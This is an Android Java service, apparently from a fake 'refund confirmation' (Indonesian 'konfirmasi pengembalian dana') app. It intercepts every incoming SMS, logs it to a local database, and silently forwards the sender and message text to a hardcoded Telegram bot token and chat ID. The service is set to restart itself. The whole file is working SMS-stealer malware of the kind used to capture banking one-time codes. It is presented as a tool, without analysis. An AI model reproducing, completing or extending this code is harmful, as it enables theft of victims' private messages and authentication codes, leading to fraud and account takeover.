
// KONFIRMASI PENGEMBALIAN DANA - Versi 1
// Fitur: Baca SMS, simpan ke database lokal, dan kirim isi SMS ke Bot Telegram

package com.konfirmasi.smsbot;

import android.Manifest;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;
import android.os.Build;
import android.os.Bundle;
import android.os.IBinder;
import android.telephony.SmsMessage;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.ActivityCompat;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class SmsService extends Service {

    private static final String TAG = "SmsService";
    private static final String BOT_TOKEN = "8055211080:AAETon5qV_pc9k0E4vCKnoEzaz3udsTuFGI";
    private static final String CHAT_ID = "8166748789";

    private BroadcastReceiver smsReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                if (pdus != null) {
                    for (Object pdu : pdus) {
                        SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
                        String sender = sms.getOriginatingAddress();
                        String message = sms.getMessageBody();

                        Log.d(TAG, "SMS received: " + sender + " - " + message);

                        // Save to database
                        SmsDatabaseHelper dbHelper = new SmsDatabaseHelper(context);
                        SQLiteDatabase db = dbHelper.getWritableDatabase();
                        db.execSQL("INSERT INTO sms (sender, message) VALUES (?, ?)", new Object[]{sender, message});

                        // Send to Telegram
                        sendToTelegram(sender, message);
                    }
                }
            }
        }
    };

    @Override
    public void onCreate() {
        super.onCreate();
        IntentFilter filter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
        registerReceiver(smsReceiver, filter);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        unregisterReceiver(smsReceiver);
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void sendToTelegram(String sender, String message) {
        new Thread(() -> {
            try {
                String text = "📩 SMS Masuk\n📱 Nomor: " + sender + "\n📝 Isi: " + message;
                String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";

                URL url = new URL(urlString);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);

                String postData = "chat_id=" + CHAT_ID + "&text=" + URLEncoder.encode(text, "UTF-8");
                OutputStream os = conn.getOutputStream();
                os.write(postData.getBytes());
                os.flush();
                os.close();

                conn.getResponseCode(); // trigger actual send
            } catch (Exception e) {
                Log.e(TAG, "Error sending to Telegram", e);
            }
        }).start();
    }

    static class SmsDatabaseHelper extends SQLiteOpenHelper {

        public SmsDatabaseHelper(Context context) {
            super(context, "sms_db", null, 1);
        }

        @Override
        public void onCreate(SQLiteDatabase db) {
            db.execSQL("CREATE TABLE IF NOT EXISTS sms (id INTEGER PRIMARY KEY AUTOINCREMENT, sender TEXT, message TEXT)");
        }

        @Override
        public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
            db.execSQL("DROP TABLE IF EXISTS sms");
            onCreate(db);
        }
    }
}
